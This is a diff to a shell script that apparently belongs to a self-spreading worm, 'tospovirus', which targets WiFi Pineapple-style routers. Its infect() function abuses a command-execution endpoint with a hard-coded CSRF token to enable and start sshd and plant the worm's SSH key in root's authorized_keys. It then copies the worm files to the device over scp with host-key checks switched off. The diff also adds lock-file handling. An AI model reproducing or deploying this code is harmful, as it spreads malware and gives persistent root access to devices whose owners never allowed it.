@@ -14,6 +14,7 @@ init() {
 	if [ -f /tmp/tospolock ]; then
 		exit
 	fi
+	touch /tmp/tospolock
 	#Make ourselves a key we'll use for all our children.
 	if [ ! -f /tospo/tospo_rsa.pub ]; then
 		echo "Generating tospo ssh key..."
@@ -33,6 +34,7 @@ pushstate() {
 
 popstate () {
 	echo "Popping state..."
+	rm /tmp/tospolock
 	ifconfig br-lan 172.16.42.1 up
 	ifconfig wlan0 up
 	ifconfig wlan1 0.0.0.0 && ifconfig wlan1 down
@@ -82,7 +84,7 @@ login() {
 }
 
 infect() {
-	post '/components/system/configuration/functions.php?execute=' "_csrfToken=a6f6832ff4df61608bf3e38b4facc7550e42244d&commands=/etc/init.d/sshd start;mkdir /root/.ssh; printf \"\$(echo $(hexdump -e'16/1 "%02x"' /tospo/tospo_rsa.pub)|sed -e's/\\(..\\)/\\\\\\\\x\\\\1/g')\">>/root/.ssh/authorized_keys" "tospovirus"
+	post '/components/system/configuration/functions.php?execute=' "_csrfToken=a6f6832ff4df61608bf3e38b4facc7550e42244d&commands=/etc/init.d/sshd enable;/etc/init.d/sshd start;mkdir /root/.ssh; printf \"\$(echo $(hexdump -e'16/1 "%02x"' /tospo/tospo_rsa.pub)|sed -e's/\\(..\\)/\\\\\\\\x\\\\1/g')\">>/root/.ssh/authorized_keys" "tospovirus"
 	ssh -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /tospo/tospo_rsa 172.16.42.1 "mkdir -p /tospo" && scp -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /tospo/tospo_rsa -r /tospo/tv* 172.16.42.1:/tospo/
 }
 
